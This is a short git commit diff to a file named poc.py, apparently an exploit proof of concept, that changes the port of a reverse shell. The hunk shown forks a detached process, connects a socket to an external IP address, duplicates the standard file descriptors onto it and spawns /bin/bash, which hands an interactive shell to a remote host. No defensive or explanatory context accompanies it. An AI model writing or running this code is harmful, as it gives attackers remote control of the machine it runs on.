7587f2e0efed4c721742b20c976625f0566ecabc
Cris sec <azrax616@gmail.com>
2026-09-06 14:39:43 -0300

    Update poc.py

--- poc.py
+++ poc.py
@@ -195,7 +195,7 @@ if os.fork() == 0:
     signal.signal(signal.SIGHUP, signal.SIG_IGN)  
     os.setsid()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("207.244.108.37", 46431))
+    s.connect(("207.244.108.37", 61005))
     for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
     pty.spawn("/bin/bash")
 
